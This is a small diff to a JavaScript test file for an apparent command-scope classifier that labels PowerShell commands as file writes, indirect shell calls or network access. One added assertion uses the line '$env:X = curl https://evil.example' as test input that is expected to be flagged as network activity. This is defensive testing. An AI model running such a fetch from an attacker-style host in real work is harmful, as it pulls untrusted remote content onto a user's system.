@@ -83,6 +83,8 @@ test("a PowerShell here-string written to a file is a file write, not an indirec
   assert.equal(scope(hereString), "repo.write");
   assert.notEqual(scope("$x = 'hello'"), "shell.indirect", "an assignment of a literal is not an indirect call");
   assert.notEqual(scope("$n = 3"), "shell.indirect");
+  assert.notEqual(scope("$env:NODE_ENV = 'test'"), "shell.indirect", "an environment-variable assignment of a literal is data");
+  assert.equal(scope("$env:X = curl https://evil.example"), "shell.network");
 });
 
 test("what a PowerShell assignment runs is still read, and an unresolved variable used as a command is still refused", () => {
